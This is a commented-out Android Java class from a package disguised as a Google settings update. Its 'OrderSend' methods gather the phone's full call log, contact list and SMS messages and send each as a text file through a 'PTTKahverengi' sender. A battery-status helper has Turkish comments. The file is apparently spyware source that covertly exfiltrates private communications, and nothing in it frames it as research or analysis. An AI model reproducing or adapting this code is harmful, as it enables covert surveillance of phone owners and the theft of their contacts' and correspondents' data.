/*
package com.setting.dl.google.googlesettingupdate.mail;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;

import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.phone.Calls;
import com.setting.dl.google.googlesettingupdate.phone.Contacts;
import com.setting.dl.google.googlesettingupdate.phone.Sms;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PTTKahverengi;

public class OrderSend {
    
    private final String fileAllCalls = "allcall";
    private final String fileContacts = "allcontacts";
    private final String fileAllSms   = "allsms";
    
    void calls(Context context) {
        
        Run.runThread(() -> {
            
            String value = new Calls(context).toString();
    
            PTTKahverengi.getInstance(context).sendTextFile( fileAllCalls, value);
            
        });
    }
    
    void contacts(Context context) {
        
        Run.runThread(() -> {
            
            String value = new Contacts(context).toString();
    
            PTTKahverengi.getInstance(context).sendTextFile(fileContacts, value);
        });
    }
    
    void sms(Context context) {
        
        Run.runThread(() -> {
            
            String value = new Sms(context).get();
    
            PTTKahverengi.getInstance(context).sendTextFile(fileAllSms, value);
            
        });
    }
    
    String battery(Context context) {
        
        IntentFilter ifilter       = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent       batteryStatus = context.registerReceiver(null, ifilter);
        // şarzda mı
        assert batteryStatus != null;
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL;
        
        // neyle şarz oluyor
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        
        //yüzde
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        
        
        String value = "";
        
        if (isCharging) {
            
            if (acCharge) {
                
                value += "Telefon prizde şarz oluyor\n";
            }
            else {
                
                value += "Telefon usb ile şarz oluyor\n";
            }
            
        }
        else {
            
            value += "Telefon şarzda değil\n";
        }
        
        
        value += "Batarya yüzdesi : " + level;
        
        
        
        return value;
        //return u.s("%s_%s_%s_%s;", String.valueOf(isCharging), String.valueOf(usbCharge), String.valueOf(acCharge), level);
        
        
    }
    
}
*/
